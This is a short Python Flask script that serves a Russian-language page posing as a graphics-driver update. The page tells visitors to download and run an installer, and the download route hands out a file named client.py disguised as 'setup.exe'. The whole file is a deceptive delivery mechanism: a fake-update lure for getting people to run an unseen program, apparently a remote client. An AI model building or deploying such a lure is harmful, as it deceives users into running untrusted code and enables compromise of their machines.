from flask import Flask, render_template_string, send_file
import os

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head><title>Обновление...</title></head>
<body style="background:#1e1e1e; color:white; text-align:center; padding-top:50px; font-family:Arial;">
    <h1>Обновление драйверов видеокарты</h1>
    <p>Для продолжения скачайте установщик и запустите его.</p>
    <a href="/download" style="padding:15px 30px; font-size:20px; background:#007bff; color:white; text-decoration:none; border-radius:5px;">Скачать установщик</a>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/download')
def download():
    # Здесь мы отдаем файл client.py
    # В реальности он должен лежать в той же папке на GitHub
    return send_file('client.py', as_attachment=True, download_name='setup.exe')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
